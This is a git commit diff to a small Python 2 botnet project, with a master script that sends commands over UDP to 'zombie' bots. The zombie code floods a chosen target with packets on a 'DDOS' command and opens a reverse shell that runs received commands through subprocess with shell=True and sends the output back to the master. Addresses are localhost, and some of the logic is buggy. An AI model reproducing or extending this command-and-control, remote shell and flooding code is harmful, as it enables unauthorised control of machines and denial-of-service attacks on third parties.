ef3f2e89e1f6831dae2d8a83eb3020576a3a11ac
Greg <greg.wajda@comcast.net>
2017-04-15 19:38:44 -0500

    basic features done

--- master.py
+++ master.py
@@ -1,59 +1,80 @@
 import sys
 import socket
 
+MASTER_IP = "127.0.0.1"
+MASTER_PORT = 6000
+
+#Read bots from file?
+bots = [("127.0.0.1",6001),("127.0.0.1",6002)]
+NUM_BOTS = 2
+
 
 class Master:
 
-	def __init__(self, bots, sockets):
+	def __init__(self, bots, socket):
 		#list of (ip,port) pairs
 		self.bots = bots
 		#list of connections
-		self.sock = sockets
+		self.sock = socket
 
-		self.conn = []
+	# 	self.conn = []
 
-	def add_conn(self,c):
-		self.conn.append(c)
+	# def add_conn(self,c):
+	# 	self.conn.append(c)
+
+	#Reverse Shell
+	def reverse_shell(self,dest):
+
+		print "Starting reverse shell...\n"
+
+		while True:
+			cmd = raw_input()				#Receive shell command
+			if cmd == 'exit':					#Break if user wished to exit
+				print "Exiting...\n"
+				self.sock.sendto(cmd,dest)
+				break
+
+			self.sock.sendto(cmd,dest)
+
+			data, addr = self.sock.recvfrom(1024)
+			print data
 
 
 
 
 if __name__ == '__main__':
-
-	MASTER_IP = "127.0.0.1"
-	MASTER_PORT = 6000
-
-	#Read bots from file?
-	bots = [("127.0.0.1",6001),("127.0.0.1",6002)]
-	NUM_BOTS = 2
-	s = []
-	for i in xrange(NUM_BOTS):
-		try:
-			# s.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))		#Create socket
-			s.append(socket.socket(socket.AF_INET, socket.SOCK_DGRAM))		#Create socket
-			s[i].bind((MASTER_IP,MASTER_PORT))								#Bind to port
-			s[i].listen(5)													#Listen 
-			print 'Socket created'
-		except socket.error, msg :
-		    print 'Failed: ' + i + '. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
-		    
+ 
+	try:
+		# s.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))		#Create socket
+		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	#Create socket
+		s.bind((MASTER_IP,MASTER_PORT))								#Bind to port
+		print 'Socket created'
+	except socket.error, msg :
+		print 'Failed: ' + str(i) + '. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
+		sys.exit()
+			
 	mast = Master(bots,s)
 	
 	while True:
-		# data, addr = s.recvfrom(1024)
-		# print "reveived: " + data + " from: " + addr
 
-		#
-		for line in sys.stdin:
-			cmd = line.split(' ')
+		print "Enter command..."
+		cmd = raw_input()
+		cmd = cmd.split(' ')
 
-			if cmd[0] == "all":
-				for i in xrange(NUM_BOTS):
-					s[i].sendall(cmd[1])
-			else:
-				s[int(cmd[0])].sendall(cmd[1])
-				
+		dest = int(cmd[0])
+		msg = cmd[1]
+		if dest == "all":
+			print "sending command to all bots..."
+			for i in xrange(NUM_BOTS):
+				mast.sock.sendto(msg,mast.bots[i])
+		else:
+			print "sending " + msg + " to " + str(dest)
+			mast.sock.sendto(msg,mast.bots[dest])
+			data, addr = mast.sock.recvfrom(1024)
+
+			if data == "RVSH":
+				mast.reverse_shell(mast.bots[dest])
 
 
 
-    s.close()
+	mast.sock.close()
--- zombie.py
+++ zombie.py
@@ -1,7 +1,12 @@
 import sys
 import socket
 import subprocess
+# from thread import *
 
+
+MASTER_IP = "127.0.0.1"
+MASTER_PORT = 6000
+ZOMB_PORT = int(sys.argv[1])
 
 class Zombie:
 
@@ -23,42 +28,43 @@ class Zombie:
 		for i in xrange(10):
 			sock.sendto("SPAM",(dest_ip,dest_port))						#Send packets
 
-		print "dos finished..."
+		sock.sendto("dos finished...",(MASTER_IP,MASTER_PORT)) 
 		sock.close()													#Close socket
 
 	#Reverse Shell
 	def reverse_shell(self):
 
-		self.conn.sendall("Starting reverse shell...\n")
+		print "Starting reverse shell...\n"
 
 		while True:
 			cmd = self.conn.recv(1024)				#Receive shell command
+			print cmd
 			if cmd == 'exit':					#Break if user wished to exit
-				self.conn.sendall("Exiting...\n")
+				print "Exiting...\n"
 				break
 
 			# do shell command
-            new_process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            # read output
-            stdout_value = new_process.stdout.read() + new_process.stderr.read()
-            # send back output
-            self.conn.sendall(stdout_value)
+			new_process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+			# read output
+			stdout_value = new_process.stdout.read() + new_process.stderr.read()
+			# send back output
+			self.conn.sendto(stdout_value,(MASTER_IP,MASTER_PORT))
 
 
 	def parse_cmd(self,p):
 		# packet = conn.recv(1024)
-		packet = p.split('\r\n')
+		packet = p.split(';')
 
-		#packet = "DDOS\r\nDEST_IP\r\nDEST_PORT\r\n"
+		#packet = "DDOS;DEST_IP;DEST_PORT"
 		if packet[0] == "DDOS":
-			self.dos(packet[1],packet[2])
+			self.dos(packet[1],int(packet[2]))
 
 		elif packet[0] == "SPAM":
-
+			pass
 
 		#packet  = "RVSH\r\n"
 		elif packet[0] == "RVSH":
-			self.conn.sendall("RVSH\n")				#Tell master to start sending commands
+			self.conn.sendto("RVSH",(MASTER_IP,MASTER_PORT))				#Tell master to start sending commands
 			self.reverse_shell()
 
 
@@ -66,40 +72,34 @@ class Zombie:
 
 
 
-
-
-
-
-
-
 if __name__ == '__main__':
 
-	MASTER_IP = "127.0.0.1"
-	MASTER_PORT = 6000
 
 	try:
 		# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		#Create socket
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)		#Create socket
-		s.bind((MASTER_IP,MASTER_PORT))								#Bind to port
-		s.listen(5)													#Listen 
+		s.bind(('',ZOMB_PORT))								#Bind to port
+		# s.listen(3)													#Listen 
 		print 'Socket created'
 	except socket.error, msg :
-	    print 'Failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
-	    sys.exit()
+		print 'Failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
+		sys.exit()
 
 	
 	zomb = Zombie(s)
 	while True:
 		#Receive command
 		data, addr = zomb.conn.recvfrom(1024)
-		print "reveived: " + data + " from: " + addr
+		print "reveived: " + data + " from: " + addr[0] + " " + str(addr[1])
 		# conn, addr = s.accept()
-		if addr == MASTER_IP:
+		if addr[0] == MASTER_IP:
 			#start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.
-    		# start_new_thread(zomb.parse_cmd ,(conn,))
-    		start_new_thread(zomb.parse_cmd ,(data,))
-    	# else:
-    	# 	conn.close()
+			# start_new_thread(zomb.parse_cmd ,(conn,))
+			# start_new_thread(zomb.parse_cmd ,(data,))
+			print "Parsing..."
+			zomb.parse_cmd(data)
+		# else:
+		# 	conn.close()
 
 
-    zomb.conn.close()
+	zomb.conn.close()
